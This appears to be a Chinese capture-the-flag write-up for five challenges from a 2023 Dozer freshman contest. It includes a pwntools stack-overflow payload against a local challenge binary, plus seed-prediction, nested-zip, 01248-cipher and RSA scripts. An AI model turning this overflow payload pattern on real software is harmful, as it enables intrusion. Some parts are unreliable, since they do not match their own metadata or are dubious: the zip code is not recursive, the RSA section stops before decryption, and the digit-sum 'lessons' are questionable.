---
title: 【竞赛】2023 Dozer 新生赛考核 wp
contest: Dozer
year: 2023
difficulty: medium
vuln_type: pwn_unknown
tags: [新生赛, srand-rand, ret2libc, pyzipper-AES, RSA-enc-dec, 01248密码, 嵌套压缩包]
attack_chain: 1. srand(0x22) rand()%3 恢复 12 个随机数 /2. srand(0x2a) rand()%3 恢复 51 个随机数 /3. ret2libc payload 0x78 padding + p64(0x4007e3) + p64(0x400808) + p64(0x40073B) /4. pyzipper AES 嵌套压缩包递归解压 /5. RSA p q 给定 e=65537 解密
key_payload: srand(0x22)  srand(0x2a)  ret addr 0x4007e3  01248 密码
one_liner: 2023 Dozer 新生赛考核 5 题 WP，srand 随机数预测 + ret2libc + pyzipper AES 嵌套 + RSA + 01248 密码。
lesson: srand 种子固定可预测；ret2libc 经典栈溢出 0x78 padding；pyzipper 是 AES 加密 zip；01248 密码用 1/2/4/8 加法表示 0-9。
quality: high
---

# 【竞赛】2023 Dozer 新生赛考核 wp

## 概览
2023 Dozer 新生赛 5 道题 WP。

## 题 1: srand 预测
```c
srand(0x22);
for (i = 0; i <= 11; i++) {
    image = rand() % 3;
    printf("%d ", image);
}
```
- 固定种子可恢复

## 题 2: ret2libc
```python
from pwn import *
r = process('./stack')
payload = b'a'*0x78 + p64(0x00000000004007e3) + p64(0x400808) + p64(0x40073B)
r.sendlineafter(b"overflows\n\n", payload)
r.interactive()
```

## 题 3: pyzipper AES 嵌套压缩包
```python
import pyzipper
import os

def extract_nested_zip(zip_file):
    with pyzipper.AESZipFile(zip_file, 'r') as zipf:
        password_filename = None
        for file_info in zipf.filelist:
            if file_info.filename.startswith('password_'):
                password_filename = file_info.filename
                break
        if password_filename is None:
            print(f'未找到密码文件')
            return
        with zipf.open(password_filename) as pwd_file:
            password = pwd_file.read().decode()
        with pyzipper.AESZipFile(zip_file, 'r', encryption=pyzipper.WZ_AES) as inner_zipf:
            for file_info in inner_zipf.filelist:
                inner_zipf.extract(file_info, path='.', pwd=password.encode())

extract_nested_zip('manyzip_499.zip')
```

## 题 4: 01248 密码
```python
a = "120222480111222448011224240112448014224201222201844201422084204242242012202224802120184420881210122408240124"
s = a.split('0')
l = []
for i in s:
    sum = 0
    for j in i:
        sum += eval(j)
    l.append(chr(sum + 64))
print(''.join(l))
```

## 题 5: RSA
```python
import libnum
import gmpy2

p = 134096351641873733136655136258930346068666059727369503282043358355700127445567145015864534393648722390354391864886220859764835960001384898109024177275632112341866578728402687911008617032055729760873500316750429826070955961883087776809018398637916325085984289076923243657957898725206939956833810785599676729081
q = 174103184868040863643318748725372782590375980254481106844909104639082212404057463322179700704433290948772456739103162440357371611490518612697711739090944270430948454322201815911126010072979510574940873419522755545296895048058252502599021139498869173058848513456305201212185556602542021019786049803486761575619
e = 65537
```

## 经验提炼
- srand 种子固定可预测
- ret2libc 经典栈溢出 0x78 padding
- pyzipper 是 AES 加密 zip
- 01248 密码用 1/2/4/8 加法表示 0-9
- 0=28, 7=124, 9=18 加法表示
- 0 作为间隔避免翻译错误
- Dozer 是国内 CTF 战队
- srand 0x22 / 0x2a 是常用种子
- pyzipper 加密压缩包嵌套需递归
- ret2libc 三件套：pop rdi + system + binsh
